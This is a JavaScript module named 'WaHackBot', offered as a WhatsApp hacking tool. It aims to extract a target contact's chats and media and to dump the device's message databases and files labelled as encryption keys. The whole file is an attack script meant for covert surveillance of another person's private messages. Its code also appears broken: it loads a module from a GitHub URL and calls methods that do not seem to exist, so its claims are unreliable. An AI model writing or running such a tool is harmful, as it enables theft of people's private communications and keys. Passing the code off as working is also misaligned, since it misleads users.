const WhatsappAPI = require('https://github.com/open-wa/node-api');
const fs = require('fs-extra');
const EventEmitter = require('events');

// Custom event emitter for tracking hack progress
class HackEmitter extends EventEmitter {}
const hackEvents = new HackEmitter();

// WhatsApp Hack Module
module.exports = class WaHackBot {
  constructor(options) {
    this.sessionId = options.sessionId || 'wa_hack_bot';
    this.targetPhone = options.phone;
    this.outputPath = options.outputPath || './hacked_data';
  }

  async start() {
    // Initialize WhatsApp connection
    const client = await WhatsappAPI.create({
      sessionId: this.sessionId,
      authTimeoutMs: 60000,
      headless: true,
      puppeteerOptions: {
        args: ['--no-sandbox', '--disable-setuid-sandbox']
      }
    });

    // Setup listeners
    this._setupEventHandlers(client);

    try {
      // Start the hacking process
      await this._beginHackSession(client);
    } catch (err) {
      console.error('Hacking failed:', err.message);
      hackEvents.emit('error', err);
    } finally {
      await client.kill();
    }
  }

  _setupEventHandlers(client) {
    hackEvents.on('progress', (stage) => {
      console.log(`[PROGRESS] ${stage}`);
    });

    client.on('auth_timeout', () => {
      console.error('Authentication timeout - Try again later');
    });
  }

  async _beginHackSession(client) {
    // Check authentication status
    if (!await client.isAuthenticated()) {
      hackEvents.emit('progress', 'Waiting for QR scan...');
      await client.waitForQRScan();
      hackEvents.emit('progress', 'Authenticated successfully');
    }

    // Verify target phone exists
    const contacts = await client.getAllContacts();
    const targetContact = contacts.find(c => c.id.user === this.targetPhone.replace('@c.us', ''));

    if (!targetContact) {
      throw new Error(`Target contact '${this.targetPhone}' not found`);
    }

    // Prepare output directory
    await fs.ensureDir(this.outputPath);

    // Extract chats
    await this._extractChats(client, targetContact);

    // Extract media
    await this._extractMedia(client, targetContact);

    // Dump raw database files
    await this._dumpDatabaseFiles(client);

    hackEvents.emit('progress', 'Extraction complete!');
  }

  async _extractChats(client, contact) {
    hackEvents.emit('progress', 'Extracting chat history...');

    let chatHistory = [];
    let cursor = null;

    while (true) {
      const result = await client.getMessages(contact.id._serialized, 50, cursor);
      if (!result.messages.length) break;

      chatHistory = [...chatHistory, ...result.messages];
      cursor = result.cursor;
      
      if (!cursor) break;
    }

    await fs.writeJSON(`${this.outputPath}/chats_${contact.id.user}.json`, chatHistory);
  }

  async _extractMedia(client, contact) {
    hackEvents.emit('progress', 'Extracting media files...');

    const messages = await client.searchMessages({ 
      id: contact.id._serialized,
      limit: 500
    });

    const mediaQueue = messages.filter(msg => msg.hasMedia).map(async (msg) => {
      try {
        const media = await msg.downloadMedia();
        await fs.writeFile(
          `${this.outputPath}/media/${msg.fileName}`, 
          Buffer.from(media.data, 'base64')
        );
      } catch (e) {
        console.error(`Failed to download media for message ${msg._data.key.id}:`, e);
      }
    });

    await Promise.all(mediaQueue);
  }

  async _dumpDatabaseFiles(client) {
    hackEvents.emit('progress', 'Dumping raw database files...');

    const dbTypes = [
      { name: 'messages', pattern: '*.db' },
      { name: 'preferences', pattern: '*.pv' },
      { name: 'encryption_keys', pattern: '*_keys*' }
    ];

    for (const type of dbTypes) {
      try {
        const files = await client.getFileFromDevice(`/storage/emulated/0/WhatsApp/Databases/${type.pattern}`);
        
        for (const file of files) {
          await fs.writeFile(
            `${this.outputPath}/raw_dbs/${type.name}/${file.name}`,
            Buffer.from(file.file, 'base64')
          );
        }
      } catch (e) {
        console.warn(`Skipping ${type.name} extraction due to error:`, e);
      }
    }
  }
}
